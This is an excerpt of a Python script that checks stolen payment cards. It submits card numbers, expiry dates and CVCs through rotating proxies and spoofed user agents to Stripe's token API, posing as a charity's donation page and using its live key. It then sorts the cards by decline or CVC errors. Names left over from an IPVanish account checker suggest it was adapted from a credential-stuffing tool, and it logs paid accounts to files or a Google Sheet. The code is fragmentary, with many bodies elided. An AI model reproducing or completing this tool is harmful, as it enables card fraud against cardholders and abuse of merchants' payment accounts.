...
output_file_free = "IPVanishAc_Free_"+datetime.datetime.now().strftime("%d-%h-%H-%M")
output_file_paid = "IPVanishAc_Premium_"+datetime.datetime.now().strftime("%d-%h-%H-%M")
countFile = "."+sys.argv[0]+"_"+input_file+"_count"
proxy_file = sys.argv[2]
statusFile_name = "cc1.status"
SAMPLE_SPREADSHEET_ID = '1EptR91arylu3oPpRQT0RVQjFi73xyYt2YgPuYdNCitU'
SAMPLE_RANGE_NAME = 'IPVANISH!A1:C'

loginURL="https://api.stripe.com/v1/tokens"
...
def writeToGoogle(cred,subs,exp):
    creds = None
...
def checkSub(page):
    ...
    if time.time() > exp :
        ...
        sub="Premium"
    return sub,time.strftime('%d-%h-%y', time.localtime(int(exp)))
...
def writeToFile(cred,subs,expiry):
    global free
    global pre
    if subs == "FREE" or subs == "Error" or subs=="Expired":
        writeFree(cred)
        free+=1
    else :
        writePaid(cred,subs,expiry)
        #writeToGoogle(cred,subs,expiry)    ########ONLINE UPDATW
        pre+=1


def getEmail():
    global f_em
    return f_em.readline()
    ...
    def run(self):
        while not q.empty():
            ...
            try:
                ...
                r.proxies = proxy
                ua = get_ua()
                myusr= "email="+email+"&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.senhoa.org%2Fpages%2Fdonate-stripe&pasted_fields=number&card[number]="+cc+"&card[exp_month]="+mnt+"&card[exp_year]="+yr+"&card[cvc]="+cvv+"&card[name]="+email+"&time_on_page=10&guid=NA&muid="+muid.urn[9:]+"&sid="+sid.urn[9:]+"&key=pk_live_e3aCKx0V1arRUk8xe7227y7d"
                headv1 = {
                ...
                if "card_declined" in r1.text:
                    print(cc+":::::::Card Decline")
                elif "incorrect_cvc" in r1.text:
                    print(cc+":::: incorrect_cvc")
                else:
                    print(cc+"::::"+r1.text)
                countLoc()
